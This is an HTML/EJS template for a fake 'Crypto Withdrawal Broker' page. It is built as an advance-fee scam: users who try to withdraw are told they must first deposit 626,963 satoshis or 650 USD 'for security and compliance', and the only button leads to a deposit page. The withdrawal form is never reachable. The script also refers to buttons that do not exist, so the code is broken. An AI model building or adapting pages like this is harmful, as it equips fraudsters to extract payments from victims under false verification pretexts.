<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Crypto Withdrawal Broker</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 min-h-screen flex justify-center items-center">
  <!-- Initial Modal -->
  <div
    id="withdrawal-method-modal"
    class="fixed inset-0 bg-gray-900 bg-opacity-50 flex items-center justify-center z-50"
  >
    <div class="bg-white rounded-lg shadow-lg p-6 w-full max-w-sm">
      <h2 class="text-xl font-bold text-gray-800 mb-4">Choose Withdrawal Method</h2>
      <button
        id="crypto-withdrawal"
        class="w-full bg-blue-500 text-white font-bold py-2 px-4 rounded-lg hover:bg-blue-600 mb-2"
      >
        Crypto Withdrawal
      </button>
      <button
        id="direct-deposit"
        class="w-full bg-green-500 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-600"
      >
        Direct Deposit
      </button>
    </div>
  </div>

  <!-- Follow-up Modal -->
  <div
    id="follow-up-modal"
    class="hidden fixed inset-0 bg-gray-900 bg-opacity-50 flex items-center justify-center z-50"
  >
    <div class="bg-white rounded-lg shadow-lg p-6 w-full max-w-sm">
      <h2 class="text-xl font-bold text-gray-800 mb-4">Action Required</h2>
      <p id="follow-up-text" class="text-gray-700 mb-4">
        <!-- Dynamic content based on selection -->
      </p>
      <!-- <button
        id="contact-manager"
        class="w-full bg-red-500 text-white font-bold py-2 px-4 rounded-lg hover:bg-red-600 mb-2"
      >
        Contact Account Manager
      </button> -->
      <a
        href="fund/step1?userId=<%= user._id %>"
        class="w-fit bg-blue-500 text-white font-bold py-2 px-4 rounded-lg hover:bg-blue-600"
      >
        Make Deposit
    </a>
    </div>
  </div>

  <!-- Main Page Content -->
  <div
    id="main-content"
    class="hidden w-full max-w-md bg-white shadow-lg rounded-lg p-6"
  >
    <h1 class="text-2xl font-bold text-gray-800 mb-4">Withdraw Crypto</h1>
    <form>
      <div class="mb-4">
        <label for="crypto-type" class="block text-gray-700 font-medium mb-2">Select Cryptocurrency:</label>
        <select id="crypto-type" class="w-full border border-gray-300 rounded-lg p-2 focus:ring focus:ring-blue-300">
          <option>Bitcoin (BTC)</option>
          <option>Ethereum (ETH)</option>
          <option>Litecoin (LTC)</option>
        </select>
      </div>
      <div class="mb-4">
        <label for="wallet-address" class="block text-gray-700 font-medium mb-2">Wallet Address:</label>
        <input
          type="text"
          id="wallet-address"
          class="w-full border border-gray-300 rounded-lg p-2 focus:ring focus:ring-blue-300"
          placeholder="Enter your wallet address"
        />
      </div>
      <div class="mb-4">
        <label for="amount" class="block text-gray-700 font-medium mb-2">Amount to Withdraw:</label>
        <input
          type="number"
          id="amount"
          class="w-full border border-gray-300 rounded-lg p-2 focus:ring focus:ring-blue-300"
          placeholder="Enter the amount"
        />
      </div>
      <button
        type="submit"
        class="w-full bg-blue-500 text-white font-bold py-2 px-4 rounded-lg hover:bg-blue-600"
      >
        Withdraw
      </button>
    </form>
  </div>

  <!-- JavaScript -->
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const withdrawalMethodModal = document.getElementById("withdrawal-method-modal");
      const followUpModal = document.getElementById("follow-up-modal");
      const mainContent = document.getElementById("main-content");
      const followUpText = document.getElementById("follow-up-text");

      const cryptoWithdrawalBtn = document.getElementById("crypto-withdrawal");
      const directDepositBtn = document.getElementById("direct-deposit");
      const contactManagerBtn = document.getElementById("contact-manager");
      const makeDepositBtn = document.getElementById("make-deposit");

      cryptoWithdrawalBtn.addEventListener("click", () => {
        followUpText.textContent = "For security and compliance purposes, and to ensure the authenticity of withdrawal requests, a deposit of 626,963 satoshis is required. This process verifies account ownership and maintains system integrity. Please proceed with the deposit to continue your withdrawal request. If you have questions, contact your account manager or support team for further assistance.";
        withdrawalMethodModal.style.display = "none";
        followUpModal.style.display = "flex";
      });

      directDepositBtn.addEventListener("click", () => {
        followUpText.textContent = "For security and compliance purposes, and to ensure the authenticity of withdrawal requests, a deposit of 650.00 USD is required. This process verifies account ownership and maintains system integrity. Please proceed with the deposit to continue your withdrawal request. If you have questions, contact your account manager or support team for further assistance.";
        withdrawalMethodModal.style.display = "none";
        followUpModal.style.display = "flex";
      });

      contactManagerBtn.addEventListener("click", () => {
        alert("Redirecting to contact page...");
        // Redirect or additional logic for contacting the manager
      });

      makeDepositBtn.addEventListener("click", () => {
        followUpModal.style.display = "none";
        mainContent.style.display = "block";
      });
    });
  </script>
</body>
</html>
